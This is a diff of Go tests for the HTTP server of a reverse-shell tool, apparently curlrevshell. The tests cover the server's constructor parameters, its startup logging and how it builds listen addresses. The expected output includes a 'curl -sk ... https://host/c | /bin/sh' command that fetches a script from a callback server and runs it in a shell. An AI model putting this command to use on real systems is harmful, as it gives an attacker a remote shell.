@@ -5,7 +5,7 @@ package hsrv
  * Tests for hserv.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20250611
+ * Last Modified 20251009
  */
 
 import (
@@ -19,6 +19,9 @@ import (
 	"maps"
 	"net"
 	"net/http"
+	"reflect"
+	"slices"
+	"strconv"
 	"strings"
 	"sync"
 	"testing"
@@ -26,8 +29,10 @@ import (
 
 	"github.com/magisterquis/curlrevshell/internal/iobroker"
 	"github.com/magisterquis/curlrevshell/lib/chanlog"
+	"github.com/magisterquis/curlrevshell/lib/crstemplate"
 	"github.com/magisterquis/curlrevshell/lib/ctxerrgroup"
 	"github.com/magisterquis/curlrevshell/lib/opshell"
+	"github.com/magisterquis/curlrevshell/lib/sstls"
 )
 
 var (
@@ -76,7 +81,6 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 	s, err := New(
 		sl,
 		"127.0.0.1:0",
-		td,
 		"",
 		ich,
 		och,
@@ -86,9 +90,24 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 		true,
 		false,
 		true, /* printDebug */
+		crstemplate.Params{
+			StaticFilesDir: td,
+		},
 	)
 	if nil != err {
 		t.Fatalf("Creating server: %s", err)
+	}
+
+	/* Make sure none of the URLPaths are empty. */
+	v := reflect.ValueOf(s.params.URLPaths)
+	for i := range v.NumField() {
+		if v.Field(i).IsZero() {
+			t.Fatalf(
+				"New server's crstemplate.Params.URLPaths.%s "+
+					"not set",
+				v.Type().Field(i).Name,
+			)
+		}
 	}
 
 	/* Start the server going. */
@@ -145,35 +164,37 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 			Line:        "\n",
 			NoTimestamp: true,
 		},
-	}, {
-		want: opshell.CLine{
+	}}
+
+	for _, addr := range []string{
+		cbAddrs[0],
+		net.JoinHostPort(
+			cbAddrs[1],
+			listenPort,
+		),
+		s.l.Addr().String(),
+	} {
+		fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
 			Color: ScriptColor,
 			Line: fmt.Sprintf(
-				CurlFormat+FileSuffix,
+				"curl -sk "+
+					"--pinnedpubkey sha256//%s "+
+					"https://%s",
 				s.l.Fingerprint,
-				cbAddrs[0],
+				addr,
 			),
 			NoTimestamp: true,
-		},
-	}, {
+		}})
+	}
+	fileWCLs = append(fileWCLs, wantCLine{want: opshell.CLine{
+		Color:       ScriptColor,
+		Line:        "\n",
+		NoTimestamp: true,
+	}})
+	shellWCLs := []wantCLine{{
 		want: opshell.CLine{
 			Color: ScriptColor,
-			Line: fmt.Sprintf(
-				CurlFormat+FileSuffix,
-				s.l.Fingerprint,
-				net.JoinHostPort(cbAddrs[1], listenPort),
-			),
-			NoTimestamp: true,
-		},
-	}, {
-		want: opshell.CLine{
-			Color: ScriptColor,
-			Line: fmt.Sprintf(
-				CurlFormat+FileSuffix,
-				s.l.Fingerprint,
-				s.l.Addr().String(),
-			),
-			NoTimestamp: true,
+			Line:  "To get a shell:",
 		},
 	}, {
 		want: opshell.CLine{
@@ -182,37 +203,31 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 			NoTimestamp: true,
 		},
 	}}
-	shellWCLs := []wantCLine{{
-		want: opshell.CLine{
+	for _, addr := range []string{
+		cbAddrs[0],
+		net.JoinHostPort(
+			cbAddrs[1],
+			listenPort,
+		),
+		s.l.Addr().String(),
+	} {
+		shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
 			Color: ScriptColor,
-			Line:  "To get a shell:",
-		},
-	}, {
-		want: opshell.CLine{
-			Color: ScriptColor,
-			Line: "\n" + strings.Join([]string{
-				fmt.Sprintf(
-					CurlFormat+ShellSuffix,
-					s.l.Fingerprint,
-					cbAddrs[0],
-				),
-				fmt.Sprintf(
-					CurlFormat+ShellSuffix,
-					s.l.Fingerprint,
-					net.JoinHostPort(
-						cbAddrs[1],
-						listenPort,
-					),
-				),
-				fmt.Sprintf(
-					CurlFormat+ShellSuffix,
-					s.l.Fingerprint,
-					s.l.Addr().String(),
-				),
-			}, "\n") + "\n\n",
+			Line: fmt.Sprintf(
+				"curl -sk "+
+					"--pinnedpubkey sha256//%s "+
+					"https://%s/c | /bin/sh",
+				s.l.Fingerprint,
+				addr,
+			),
 			NoTimestamp: true,
-		},
-	}}
+		}})
+	}
+	shellWCLs = append(shellWCLs, wantCLine{want: opshell.CLine{
+		Color:       ScriptColor,
+		Line:        "\n",
+		NoTimestamp: true,
+	}})
 	wantCLines := make(
 		[]wantCLine,
 		0,
@@ -244,7 +259,8 @@ func newTestServerMaybeWithDir(t *testing.T, makeFDir bool) (
 	/* Make sure we get exactly the logs we expect. */
 	cl.ExpectEmpty(t,
 		`{"time":"","level":"INFO","msg":"Listener started",`+
-			`"address":"`+s.l.Addr().String()+`"}`,
+			`"address":"`+s.l.Addr().String()+`",`+
+			`"fingerprint":"`+s.l.Fingerprint+`"}`,
 	)
 
 	/* Don't keep going if we have an error. */
@@ -481,7 +497,6 @@ func TestServer_NoDebug(t *testing.T) {
 			slog.New(slog.DiscardHandler),
 			"127.0.0.1:0",
 			"",
-			"",
 			ich,
 			och,
 			iob,
@@ -490,6 +505,7 @@ func TestServer_NoDebug(t *testing.T) {
 			false,
 			false,
 			printDebug,
+			crstemplate.Params{},
 		)
 		if nil != err {
 			t.Fatalf(
@@ -514,14 +530,14 @@ func TestServer_NoDebug(t *testing.T) {
 			close(ich)
 			close(och)
 			for l := range och {
-				t.Errorf("Leftover output line: %v", l)
+				t.Errorf("Leftover output line: %#v", l)
 			}
 		})
 		go func() { defer wg.Done(); ech <- svr.Do(ctx) }()
 
 		/* Remove normal startup things from the output channel.  These
 		have been checked elsewhere. */
-		for range 3 {
+		for range 5 {
 			<-och
 		}
 
@@ -578,4 +594,93 @@ func TestServer_NoDebug(t *testing.T) {
 	/* Without debug output, shouldn't be anything to check.  The lack of
 	output will be checked by bannerServer. */
 	t.Run("no_debug", func(t *testing.T) { bannerServer(t, false) })
+}
+
+// Make sure we set ourselves up to debug-log paths correctly.
+func TestSlogAttrsFromURLPaths(t *testing.T) {
+	have := crstemplate.URLPaths{
+		In:     "up_In",
+		InOut:  "up_InOut",
+		Out:    "up_Out",
+		Script: "up_Script",
+	}
+
+	got := slogAttrsFromURLPaths(have)
+
+	want := []slog.Attr{
+		slog.String("In", "up_In"),
+		slog.String("InOut", "up_InOut"),
+		slog.String("Out", "up_Out"),
+		slog.String("Script", "up_Script"),
+	}
+
+	if !slices.EqualFunc(got, want, func(a, b slog.Attr) bool {
+		return a.Equal(b)
+	}) {
+		t.Errorf(
+			"Incorrect attrs returned:\n"+
+				"have: %+v\n"+
+				" got: %v\n"+
+				"want: %v",
+			have,
+			got,
+			want,
+		)
+	}
+}
+
+// Make sure Server.listenAddresses adds port number to everything.
+func TestServerListenAddresses_AddPorts(t *testing.T) {
+	/* Listener, for default port. */
+	l, err := sstls.Listen("tcp", "127.0.0.1:0", "", 0, "")
+	if nil != err {
+		t.Fatalf("Error listening: %s", err)
+	}
+
+	/* Non-listener port, for testing explicit ports. */
+	_, lPort, err := net.SplitHostPort(l.Addr().String())
+	if nil != err {
+		t.Fatalf("Error getting listener port: %s", err)
+	}
+	n, err := strconv.Atoi(lPort)
+	if nil != err {
+		t.Fatalf("Error parsing port %q: %s", lPort, err)
+	}
+	tPort := strconv.Itoa(max(10, (n+1)%65535))
+
+	/* -callback-addresses. */
+	have := []string{
+		l.Addr().String(),
+		"kittens.com",
+		net.JoinHostPort("kittens.com", tPort),
+	}
+	want := make(map[string]struct{})
+	for _, h := range have {
+		if _, p, _ := net.SplitHostPort(h); "" == p {
+			h = net.JoinHostPort(h, lPort)
+		}
+		want[h] = struct{}{}
+	}
+	if len(want) != len(have) {
+		t.Fatalf(
+			"Have %d callback addresses but %d listen addresses",
+			len(have),
+			len(want),
+		)
+	}
+
+	/* Make sure we get what we expect. */
+	gotAddrs, err := (&Server{l: l}).listenAddresses(have)
+	if nil != err {
+		t.Fatalf("Error getting listen addresses: %s", err)
+	}
+	for _, a := range gotAddrs {
+		if _, ok := want[a]; !ok {
+			t.Errorf("Extraneous listen address: %s", a)
+		}
+		delete(want, a)
+	}
+	for _, v := range slices.Sorted(maps.Keys(want)) {
+		t.Errorf("Did not get listen address %s", v)
+	}
 }
